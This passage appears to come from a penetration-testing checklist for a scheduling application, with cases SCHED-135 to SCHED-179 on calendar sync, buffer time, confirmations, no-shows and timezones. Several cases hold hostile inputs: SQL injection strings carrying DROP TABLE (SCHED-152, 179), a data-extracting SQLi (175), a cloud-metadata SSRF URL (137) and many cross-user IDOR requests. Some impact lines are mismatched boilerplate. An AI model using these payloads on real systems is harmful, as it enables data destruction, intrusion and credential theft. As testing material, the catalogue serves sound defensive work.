**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## SCHED-135 — OAuth State Parameter Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. OAuth without state parameter 2. CSRF on OAuth 3. Link attacker's calendar 4. Account hijacking

**Expected Result:** State parameter should be required

**Payload Example:**

```
OAuth flow without state parameter
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## SCHED-136 — Sync Token IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. View sync token 2. Modify user_id 3. Access another's sync token 4. Calendar access

**Expected Result:** Sync tokens should be user-specific

**Payload Example:**

```
GET /api/users/victim_id/sync-token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-137 — Calendar SSRF via Sync URL
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Configure sync URL 2. Provide internal URL 3. Server fetches internal resource 4. SSRF

**Expected Result:** Sync URLs should be validated

**Payload Example:**

```
sync_url=http://169.254.169.254/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SCHED-138 — Sync Scope Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Request minimal OAuth scope 2. Modify scope parameter 3. Get excessive permissions 4. Data theft

**Expected Result:** Scope should be fixed server-side

**Payload Example:**

```
scope=https://www.googleapis.com/auth/calendar.readonly changed to full access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / OAuth Tools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-139 — Sync Webhook Hijacking
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Configure sync webhook 2. Modify webhook URL 3. Receive others' sync data 4. Data interception

**Expected Result:** Webhooks should be verified

**Payload Example:**

```
Change webhook to attacker-controlled URL
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-140 — Calendar Import XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Import external calendar 2. Calendar contains XSS 3. Events imported 4. XSS executes

**Expected Result:** Imported content should be sanitized

**Payload Example:**

```
Import ICS with XSS in event fields
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-141 — Calendar Import XXE
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Import ICS/XML calendar 2. Include XXE payload 3. File parsed 4. Server file disclosure

**Expected Result:** Import should disable external entities

**Payload Example:**

```
ICS with XXE payload
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## SCHED-142 — Sync Frequency Abuse
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Set sync frequency 2. Modify to very frequent 3. DoS external service 4. Account ban

**Expected Result:** Sync frequency should have minimum

**Payload Example:**

```
{"sync_interval":"1"} for every second
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SCHED-143 — Sync Credentials Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. View sync configuration 2. Find credentials in response 3. Extract OAuth tokens 4. Account access

**Expected Result:** Credentials should not be exposed

**Payload Example:**

```
API response containing refresh_token
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-144 — Two-Way Sync Data Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Enable two-way sync 2. Private events synced 3. Data leaked to external service 4. Privacy violation

**Expected Result:** Private events should be filtered

**Payload Example:**

```
Private event content synced to external calendar
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SCHED-145 — Disconnect Sync IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Calendar Sync (Google/Outlook)

**Test Steps:** 1. Disconnect own sync 2. Modify user_id 3. Disconnect another's sync 4. Disrupt their integration

**Expected Result:** Disconnect should verify ownership

**Payload Example:**

```
DELETE /api/users/victim_id/calendar-sync
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-146 — Buffer Time Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Provider has buffer time 2. Book ignoring buffer 3. Overlap with buffer 4. Provider disruption

**Expected Result:** Buffer time should be enforced

**Payload Example:**

```
Book appointment in buffer period
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-147 — Buffer Time Bypass via Direct API
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. UI respects buffer time 2. Direct API booking 3. Bypass buffer check 4. Unauthorized booking

**Expected Result:** Buffer should be checked server-side

**Payload Example:**

```
Direct POST bypassing UI buffer validation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-148 — Buffer Time IDOR
**Test Category:** Broken Access Control · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. View own buffer settings 2. Modify user_id 3. View others' settings 4. Information disclosure

**Expected Result:** Settings should be user-specific

**Payload Example:**

```
GET /api/users/victim_id/buffer-settings
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-149 — Buffer Time Modification IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Modify own buffer time 2. Change user_id 3. Modify others' buffer 4. Schedule disruption

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/users/victim_id/buffer-settings
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-150 — Negative Buffer Time
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Set buffer time 2. Use negative value 3. Create time overlap 4. Scheduling conflict

**Expected Result:** Buffer time should be positive

**Payload Example:**

```
{"buffer_minutes":-30}
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SCHED-151 — Excessive Buffer Time
**Test Category:** Denial of Service · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Set buffer time 2. Set extremely long 3. Block all availability 4. Self-DoS or manipulation

**Expected Result:** Buffer time should have maximum

**Payload Example:**

```
{"buffer_minutes":99999}
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SCHED-152 — Buffer Time SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Update buffer time 2. Inject SQL in parameter 3. SQL executed 4. Data breach

**Expected Result:** Parameters should be type-validated

**Payload Example:**

```
buffer_time=30; DROP TABLE settings--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-153 — Buffer Override Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Admin override exists 2. Regular user accesses 3. Override others' buffers 4. Unauthorized control

**Expected Result:** Override should require admin role

**Payload Example:**

```
POST /api/admin/buffer-override as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-154 — Buffer Time Sync Conflict
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Buffer Time Settings

**Test Steps:** 1. Buffer time set 2. Calendar sync imports 3. Buffer not applied to synced 4. Inconsistency

**Expected Result:** Buffer should apply to all sources

**Payload Example:**

```
Synced events ignoring local buffer settings
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-155 — Confirmation IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. View own confirmation 2. Modify confirmation_id 3. View others' confirmations 4. Information disclosure

**Expected Result:** Confirmation access should verify ownership

**Payload Example:**

```
GET /api/confirmations/victim_confirmation_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-156 — Confirmation Code Prediction
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Receive confirmation code 2. Analyze pattern 3. Predict others' codes 4. Access bookings

**Expected Result:** Confirmation codes should be random

**Payload Example:**

```
Sequential confirmation codes
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-157 — Confirmation Code Brute Force
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Find confirmation lookup 2. Brute force codes 3. Access random bookings 4. Information disclosure

**Expected Result:** Code lookup should be rate-limited

**Payload Example:**

```
Enumerate short confirmation codes
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SCHED-158 — Confirmation Email Spoofing
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Book with email 2. Modify email header 3. Confirmation sent to wrong person 4. Information disclosure

**Expected Result:** Email should be validated

**Payload Example:**

```
Modify From or Reply-To header
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-159 — Confirmation PDF XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Booking has XSS 2. Confirmation PDF generated 3. PDF opened 4. Script executes

**Expected Result:** PDF content should be sanitized

**Payload Example:**

```
XSS in booking details appearing in PDF
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / PDF Tools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-160 — Confirmation SMS Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Set SMS confirmation 2. Inject malicious content 3. SMS sent 4. Phishing

**Expected Result:** SMS content should be sanitized

**Payload Example:**

```
Inject phishing link in confirmation SMS
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-161 — Confirmation QR Code Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Generate confirmation QR 2. Modify QR data 3. Create fake confirmation 4. Fraudulent access

**Expected Result:** QR codes should be signed

**Payload Example:**

```
Modify QR code to access different booking
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** QR Tools / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-162 — Resend Confirmation IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Resend own confirmation 2. Modify booking_id 3. Resend others' confirmation 4. Spam or information disclosure

**Expected Result:** Resend should verify ownership

**Payload Example:**

```
POST /api/bookings/victim_id/resend-confirmation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-163 — Confirmation Token Replay
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Use confirmation token 2. Reuse token 3. Multiple check-ins 4. Duplicate access

**Expected Result:** Tokens should be single-use

**Payload Example:**

```
Replay valid confirmation token
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## SCHED-164 — Confirmation Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Receive confirmation 2. Modify details 3. Change booking parameters 4. Unauthorized change

**Expected Result:** Confirmations should be immutable

**Payload Example:**

```
Modify confirmed booking via confirmation endpoint
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-165 — Confirmation Link Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Confirmation has links 2. Inject malicious URL 3. User clicks link 4. Phishing or XSS

**Expected Result:** Links should be validated

**Payload Example:**

```
Inject javascript: or data: URLs
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-166 — Bulk Confirmation IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Booking Confirmation

**Test Steps:** 1. Bulk confirm own bookings 2. Include others' IDs 3. Confirm unauthorized 4. Mass manipulation

**Expected Result:** Bulk operations should verify ownership

**Payload Example:**

```
POST /api/bookings/bulk-confirm {"ids":["victim_ids"]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-167 — No-Show IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Mark own booking no-show 2. Modify booking_id 3. Mark another's no-show 4. Harm their reputation

**Expected Result:** No-show marking should verify authority

**Payload Example:**

```
POST /api/bookings/victim_booking_id/no-show
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-168 — No-Show Fee Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. No-show incurs fee 2. Modify fee amount 3. Reduce or eliminate fee 4. Avoid penalty

**Expected Result:** Fees should be calculated server-side

**Payload Example:**

```
{"no_show_fee":0}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-169 — No-Show Appeal IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Appeal own no-show 2. Modify appeal_id 3. Appeal others' no-shows 4. Unauthorized action

**Expected Result:** Appeals should verify ownership

**Payload Example:**

```
POST /api/no-shows/victim_id/appeal
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-170 — No-Show Status Bypass
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Marked as no-show 2. Access booking anyway 3. Bypass no-show restriction 4. Unauthorized access

**Expected Result:** No-show should prevent access

**Payload Example:**

```
Access after no-show marking
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-171 — No-Show Threshold Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Multiple no-shows 2. Modify count 3. Avoid suspension 4. Bypass penalty

**Expected Result:** No-show count should be system-controlled

**Payload Example:**

```
{"no_show_count":0} to reset counter
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-172 — False No-Show Reporting
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Attend appointment 2. Provider marks no-show 3. No appeal mechanism 4. User harm

**Expected Result:** No-show should have verification

**Payload Example:**

```
Mark present user as no-show
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-173 — No-Show Notification Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. No-show notification sent 2. Inject in notification 3. Malicious content sent 4. Phishing

**Expected Result:** Notifications should be sanitized

**Payload Example:**

```
XSS or phishing in no-show email
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-174 — No-Show Grace Period Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Grace period for arrival 2. Mark no-show before grace 3. Premature penalty 4. Unfair treatment

**Expected Result:** Grace period should be enforced

**Payload Example:**

```
Mark no-show 1 minute after start time
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-175 — No-Show SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Query no-show history 2. Inject SQL in filter 3. Extract all data 4. Data breach

**Expected Result:** Queries should be parameterized

**Payload Example:**

```
date_filter='; SELECT * FROM no_shows--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-176 — No-Show Reversal IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. Reverse own no-show 2. Modify booking_id 3. Reverse others' no-shows 4. Unauthorized action

**Expected Result:** Reversal should verify authority

**Payload Example:**

```
POST /api/no-shows/victim_id/reverse
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-177 — No-Show Policy Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** No-Show Handling

**Test Steps:** 1. No-show policy applies 2. Use different booking method 3. Bypass policy 4. Avoid restrictions

**Expected Result:** Policy should apply universally

**Payload Example:**

```
Book via API to bypass UI no-show checks
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-178 — Timezone Manipulation Attack
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Book appointment 2. Modify timezone 3. Create time confusion 4. Show up at wrong time

**Expected Result:** Timezone should be validated and consistent

**Payload Example:**

```
{"timezone":"Invalid/Timezone"} or extreme offset
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-179 — Timezone SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-timezone Support

**Test Steps:** 1. Set timezone parameter 2. Inject SQL in timezone 3. SQL executed 4. Data breach

**Expected Result:** Timezone should be from whitelist

**Payload Example:**

```
timezone=America/New_York'; DROP TABLE--
